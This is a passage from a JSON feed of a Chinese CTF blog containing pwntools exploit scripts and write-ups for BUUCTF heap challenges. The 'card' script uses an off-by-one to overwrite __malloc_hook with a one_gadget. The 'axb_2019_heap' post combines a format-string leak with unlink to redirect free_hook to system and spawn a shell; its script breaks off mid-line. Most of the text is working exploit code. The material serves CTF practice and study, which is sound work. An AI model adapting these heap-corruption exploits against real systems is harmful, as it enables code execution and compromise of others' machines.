class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x118</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span>\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n__malloc_hook <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">360</span> <span class=\"token operator\">-</span> <span class=\"token number\">16</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"__malloc_hook\"</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\n\nlibc_base <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__malloc_hook\"</span><span class=\"token punctuation\">]</span>\nrealloc <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"realloc\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libc_base\none_gadget <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> one_gad<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"realloc\"</span><span class=\"token punctuation\">,</span>realloc<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_base\"</span><span class=\"token punctuation\">,</span>libc_base<span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0x70大小可以与malloc处伪造堆块链到</span>\n\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\ninfo<span class=\"token punctuation\">(</span>heap_addr<span class=\"token operator\">+</span><span class=\"token number\">0x2b0</span><span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>__malloc_hook <span class=\"token operator\">-</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#构造两个指针指向同一堆块</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0xb</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>one_gad<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libc_base<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>realloc <span class=\"token operator\">+</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#dbg()</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h1 id=\"card\"><a class=\"markdownIt-Anchor\" href=\"#card\">#</a> card</h1>\n<p>libc-2.27 off-by-one</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- coding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\n\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'card'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'card'</span><span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc.so\"</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\n\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n  p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">#p = process([\"qemu-aarch64\",\"-L\",\"\",binary])</span>\n  <span class=\"token comment\">#p = process([\"qemu-aarch64\",\"-L\",\"\",-g,\"1234\",binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n  host <span class=\"token operator\">=</span> <span class=\"token string\">\"node3.buuoj.cn\"</span>\n  port <span class=\"token operator\">=</span>  <span class=\"token number\">25850</span>\n  p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>      <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x7f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>      <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\xf7\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b  <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b  <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\": 0x%x\"</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>      <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a     <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"choice:\"</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"card:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"power:\"</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"quickly!\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"card\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"show\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"card:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\none_gadget <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4f2c5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4f322</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10a38c</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  add<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">0x98</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x98</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x98</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  delete<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">)</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span>\nl64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n__malloc_hook <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">240</span> <span class=\"token operator\">-</span> <span class=\"token number\">16</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak\"</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\nlibc_base <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"__malloc_hook\"</span><span class=\"token punctuation\">]</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x41\"</span> <span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>__malloc_hook<span class=\"token punctuation\">)</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>one_gadget<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\"card:\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\"power:\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "堆",
                "BUUCTF",
                "DASCTF"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/",
            "url": "http://niyah.cn/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/",
            "title": "记一道Unlink",
            "date_published": "2021-04-02T14:10:27.000Z",
            "content_html": "<blockquote>\n<p>unlink</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"axb_2019_heap\"><a class=\"markdownIt-Anchor\" href=\"#axb_2019_heap\">#</a> axb_2019_heap</h1>\n<h2 id=\"初探\"><a class=\"markdownIt-Anchor\" href=\"#初探\">#</a> 初探</h2>\n<p>保护全开，特别哈人</p>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/1.png\"></center>\n<p>接下来打开 IDA 康康，可以发现开始有一个格式化字符串漏洞，那么我们可以用格式化字符串泄露栈上的值，那么我们最好是可以通过这个泄露出开 PIE 后的基地址和 libc 的基地址，这样就方便后面的操作</p>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/2.png\"></center>\n<p>输入函数存在可以溢出一个字节存在 off-by-one~~，既然存在 off-by-one 那么理应是有几种利用方法的，但我觉得 Unlink 更加 OK（~~</p>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/3.png\"></center>\n<h2 id=\"泄露地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露地址\">#</a> 泄露地址</h2>\n<p>我们在利用格式化字符串进行泄露时，我们可以动态调试一下，去看看栈上有哪些可以利用的地方，并且格式化字符串也并不是一次只能泄露出一个地址，我们可以贪心地把我们需要的栈上变量都泄露出来</p>\n<p>这里我们寻找栈上的变量直接发现第 10 个和第 14 个就是我们需要泄露的数据，（当然这里也可以找别的，只要能算出来就行…），又由于 64 位传参，前 6 个参数不在栈上所以是 10 + 6-1 和 14 + 6-1 为什么 - 1 懂的都懂</p>\n<blockquote>\n<p>%15$p,%19$p</p>\n</blockquote>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/4.png\"></center>\n<p>泄露之后我们就可以把开 PIE 后的基地址算出来，最后把指针数组的地址算出来就可以进行下一步利用了；</p>\n<h2 id=\"unlink\"><a class=\"markdownIt-Anchor\" href=\"#unlink\">#</a> Unlink</h2>\n<ol>\n<li>\n<p>我们先申请 4 个堆块，既然要造成 Unlink<sup class=\"footnote-ref\"><a href=\"#fn1\" id=\"fnref1\">[1]</a></sup>，那么 free 的那个大小应该至少属于 unsortedbin，大小大于 0x88 就可以，这里我们申请 0x98 大小的堆块，刚好就可以溢出到下一个堆块的 size 位</p>\n</li>\n<li>\n<p>改写一个 unsortedbin 之前的堆块，伪造出<kbd>fake_chunk</kbd>的结构（在一个正常堆块里伪造出一个 bin 结构）</p>\n</li>\n</ol>\n<blockquote>\n<p>提一嘴为什么是 ptr-0x8，因为我首先 malloc 了一个 chunk 没用它，其后我们要找一个指针指向我们的第二个 chunk 的数据段，当然就应该找数组存放的第二个指针了，用这个指针构造出一前一后两个 chunk 和<kbd>fake_chunk</kbd>相互 link 的假象，那么再释放第三个 chunk 时就会触发 Unlink，让其和前一个<kbd>fake_chunk</kbd>合并，合并的时候<kbd>fake_chunk</kbd>和数组 chunk 解连接，让数组的一个指针指向自己，完成 unlink</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">0xA1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">pre_size=0</td>\n<td style=\"text-align:center\">size=0x80</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">fd=ptr-0x8</td>\n<td style=\"text-align:center\">bk=ptr</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">…</td>\n<td style=\"text-align:center\">…</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">0x80</td>\n<td style=\"text-align:center\">0xa0</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"3\">\n<li>删除第三个堆块，让触发 unlink，这里数组的第二个指针指向了数组地址 - 0x8 位置</li>\n</ol>\n<center><img src=\"/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/5.png\"></center>\n<h2 id=\"getshell\"><a class=\"markdownIt-Anchor\" href=\"#getshell\">#</a> Getshell</h2>\n<ol>\n<li>修改<kbd>free_hook</kbd>成为<kbd>system</kbd>函数的地址，<s>这题保护全开只能改<kbd>free_hook</kbd>，不然还可以改 atoi 函数</s></li>\n<li>删除第四个块，执行 system (&quot;/bin/sh&quot;) 成功 getshell</li>\n</ol>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\">#coding=utf-8</span>\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc/libc-2.23.so\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#p = process(\"./axb_2019_heap\")</span>\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">\"debug\"</span>\np <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"node3.buuoj.cn\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">26984</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">choice</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>text<span class=\"token operator\">=</span><span class=\"token string\">\"aaaa\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tchoice<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tchoice<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token operator\">=</span><span class=\"token string\">\"aaaa\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tchoice<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tp<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#gdb.attach(p)</span>\n<span class=\"token comment\">#格式化字符串漏洞利用</span>\np<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter your name: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"%15$p,%19$p\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello, \"</span><span class=\"token punctuation\">)</span>\nlibc_start_main <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x7fcd46b5f830\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">240</span>\nlibc_base <span class=\"token operator\">=</span> libc_start_main <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"__libc_start_main\"</span><span class=\"token punctuation\">]</span>\n\nlog<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_start_main: \"</span><span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token 